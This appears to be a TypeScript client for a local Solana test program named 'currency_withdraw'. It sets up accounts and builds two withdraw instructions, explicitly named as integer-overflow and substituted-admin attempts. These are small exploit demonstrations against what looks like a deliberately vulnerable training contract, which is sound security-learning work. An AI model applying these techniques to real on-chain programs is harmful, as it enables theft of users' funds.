/* eslint-disable @typescript-eslint/no-unsafe-assignment */
/* eslint-disable @typescript-eslint/no-unsafe-member-access */

import {
  Keypair,
  Connection,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  Transaction,
  sendAndConfirmTransaction,
} from '@solana/web3.js';
import fs from 'mz/fs';
import path from 'path';
import * as borsh from 'borsh';

/* eslint-disable @typescript-eslint/no-unsafe-assignment */
/* eslint-disable @typescript-eslint/no-unsafe-member-access */
/* eslint-disable @typescript-eslint/no-unsafe-return */

import os from 'os';
import yaml from 'yaml';

/**
 * @private
 */
async function getConfig(): Promise<any> {
   
  const CONFIG_FILE_PATH = path.resolve(
    os.homedir(),
    '.config',
    'solana',
    'cli',
    'config.yml',
  );
  const configYml = await fs.readFile(CONFIG_FILE_PATH, {encoding: 'utf8'});
  return yaml.parse(configYml);
}


export async function getPayer(): Promise<Keypair> {
  try {
    const config = await getConfig();
    if (!config.keypair_path) throw new Error('Missing keypair path');
    return await createKeypairFromFile(config.keypair_path);
  } catch (err) {
    console.warn(
      'Failed to create keypair from CLI config file, falling back to new random keypair',
    );
    return Keypair.generate();
  }
}


export async function createKeypairFromFile(
  filePath: string,
): Promise<Keypair> {
  const secretKeyString = await fs.readFile(filePath, {encoding: 'utf8'});
  const secretKey = Uint8Array.from(JSON.parse(secretKeyString));
  return Keypair.fromSecretKey(secretKey);
}


let connection: Connection;

let payer: Keypair;

let programId: PublicKey;

let userWalletPubkey: PublicKey;

let adminWalletPubkey: PublicKey;

let configAccountPubkey: PublicKey;

const PROGRAM_PATH = path.resolve(__dirname, './dist/program');

const PROGRAM_SO_PATH = path.join(PROGRAM_PATH, 'currency_withdraw.so');


const PROGRAM_KEYPAIR_PATH = path.join(PROGRAM_PATH, 'currency_withdraw-keypair.json');

class WithdrawAccount {
  balance = 0;
  amount_withdrawn = 0;
  constructor(fields: {balance: number, amount_withdrawn: number} | undefined = undefined) {
    if (fields) {
      this.balance = fields.balance;
      this.amount_withdrawn = fields.amount_withdrawn;
    }
  }
}

class ConfigAccount {
  admin = "644NM5ywCPwjuzhVS4U4acqt1RWiQVew8qycW5SUVqXq";
  balance = 0;
  constructor(fields: {balance: number, admin: string} | undefined = undefined) {
    if (fields) {
      this.balance = fields.balance;
      this.admin = fields.admin;
    }
  }
}



const WithdrawSchema = new Map([
  [WithdrawAccount, {kind: 'struct', fields: [['balance', 'u8'], ['amount_withdrawn', 'u8']]}],
]);

const ConfigSchema = new Map([
  [ConfigAccount, {kind: 'struct', fields: [['balance', 'u8'], ['admin', 'String']]}],
]);


const WITHDRAW_SIZE = borsh.serialize(
  WithdrawSchema,
  new WithdrawAccount(),
).length;

const CONFIG_SIZE = borsh.serialize(
  ConfigSchema,
  new ConfigAccount(),
).length;


export async function establishConnection(): Promise<void> {
  connection = new Connection("http://127.0.0.1:8899", 'confirmed');
  const version = await connection.getVersion();
  console.log('Connection to cluster established:', "http://127.0.0.1:8899", version);
}


export async function establishPayer(): Promise<void> {
  let fees = 0;
  if (!payer) {
    const {feeCalculator} = await connection.getRecentBlockhash();
    
    fees += await connection.getMinimumBalanceForRentExemption(WITHDRAW_SIZE);

    fees += feeCalculator.lamportsPerSignature * 100;  

    payer = await getPayer();
  }

  let lamports = await connection.getBalance(payer.publicKey);
  if (lamports < fees) {
     
    const sig = await connection.requestAirdrop(
      payer.publicKey,
      fees - lamports,
    );
    await connection.confirmTransaction(sig);
    lamports = await connection.getBalance(payer.publicKey);
  }

  console.log(
    'Using account',
    payer.publicKey.toBase58()
  );
}

export async function checkProgram(): Promise<void> {
   
  try {
    const programKeypair = await createKeypairFromFile(PROGRAM_KEYPAIR_PATH);
    programId = programKeypair.publicKey;
  } catch (err) {
    const errMsg = (err as Error).message;
    throw new Error(
      `Failed to read program keypair at '${PROGRAM_KEYPAIR_PATH}' due to error: ${errMsg}. Program may need to be deployed with \`solana program deploy dist/program/currency_withdraw.so\``,
    );
  }

   
  const programInfo = await connection.getAccountInfo(programId);
  if (programInfo === null) {
    if (fs.existsSync(PROGRAM_SO_PATH)) {
      throw new Error(
        'Program needs to be deployed with `solana program deploy dist/program/currency_withdraw.so`',
      );
    } else {
      throw new Error('Program needs to be built and deployed');
    }
  } else if (!programInfo.executable) {
    throw new Error(`Program is not executable`);
  }

   
  const USER_WALLET_SEED = 'USER_WALLET';
  userWalletPubkey = await PublicKey.createWithSeed(
    payer.publicKey,
    USER_WALLET_SEED,
    programId,
  );
  
  const ADMIN_WALLET_SEED = 'USER_WALLET';
  adminWalletPubkey = await PublicKey.createWithSeed(
    payer.publicKey,
    ADMIN_WALLET_SEED,
    programId,
  );

  const CONFIG_WALLET_SEED = 'CONFIG_WALLET';
  configAccountPubkey = await PublicKey.createWithSeed(
    payer.publicKey,
    CONFIG_WALLET_SEED,
    programId,
  );

  const userWalletAccount = await connection.getAccountInfo(userWalletPubkey);
  const adminWalletAccount = await connection.getAccountInfo(adminWalletPubkey);
  const configAccount = await connection.getAccountInfo(configAccountPubkey);

  if (userWalletAccount === null) {
    console.log(
      'Creating account',
      userWalletPubkey.toBase58()
    );
    const lamports = await connection.getMinimumBalanceForRentExemption(
      WITHDRAW_SIZE,
    );

    const transaction = new Transaction().add(
      SystemProgram.createAccountWithSeed({
        fromPubkey: payer.publicKey,
        basePubkey: payer.publicKey,
        seed: USER_WALLET_SEED,
        newAccountPubkey: userWalletPubkey,
        lamports,
        space: WITHDRAW_SIZE,
        programId,
      }),
    );
    await sendAndConfirmTransaction(connection, transaction, [payer]);
  }else if(adminWalletAccount === null){
    console.log(
      'Creating account',
      adminWalletPubkey.toBase58()
    );
    const lamports = await connection.getMinimumBalanceForRentExemption(
      WITHDRAW_SIZE,
    );

    const transaction = new Transaction().add(
      SystemProgram.createAccountWithSeed({
        fromPubkey: payer.publicKey,
        basePubkey: payer.publicKey,
        seed: ADMIN_WALLET_SEED,
        newAccountPubkey: adminWalletPubkey,
        lamports,
        space: WITHDRAW_SIZE,
        programId,
      }),
    );
    await sendAndConfirmTransaction(connection, transaction, [payer]);
  }else if(configAccount === null){
    console.log(
      'Creating account',
      configAccountPubkey.toBase58()
    );
    const lamports = await connection.getMinimumBalanceForRentExemption(
      CONFIG_SIZE,
    );

    const transaction = new Transaction().add(
      SystemProgram.createAccountWithSeed({
        fromPubkey: payer.publicKey,
        basePubkey: payer.publicKey,
        seed: CONFIG_WALLET_SEED,
        newAccountPubkey: configAccountPubkey,
        lamports,
        space: CONFIG_SIZE,
        programId,
      }),
    );
    await sendAndConfirmTransaction(connection, transaction, [payer]);
  }
}


export async function attemptIntegerOverflowWithdraw(amount_to_withdraw: number): Promise<TransactionInstruction> {
  console.log('Withdrawing using:', userWalletPubkey.toBase58());
  return new TransactionInstruction({
    keys: [{pubkey: userWalletPubkey, isSigner: false, isWritable: true},
          { pubkey: payer.publicKey, isSigner: true, isWritable: false }],
    programId,
    data: Buffer.from(new Uint8Array([0, amount_to_withdraw])),
  });
}

export async function attemptSubstituteAdminWithdraw(amount_to_withdraw: number): Promise<TransactionInstruction> {
  console.log('Withdrawing using:', userWalletPubkey.toBase58());
  return new TransactionInstruction({
    keys: [{pubkey: userWalletPubkey, isSigner: false, isWritable: true},
          {pubkey: adminWalletPubkey, isSigner: false, isWritable: true},
          { pubkey: configAccountPubkey, isSigner: false, isWritable: false }],
    programId,
    data: Buffer.from(new Uint8Array([1, amount_to_withdraw])),
  });
}


export async function reportWithdrawn(): Promise<WithdrawAccount> {
  const accountInfo = await connection.getAccountInfo(userWalletPubkey);
  if (accountInfo === null) {
    throw 'Error: cannot find the wallet account';
  }
  const programResponse = borsh.deserialize(
    WithdrawSchema,
    WithdrawAccount,
    accountInfo.data,
  );
  return programResponse;
}
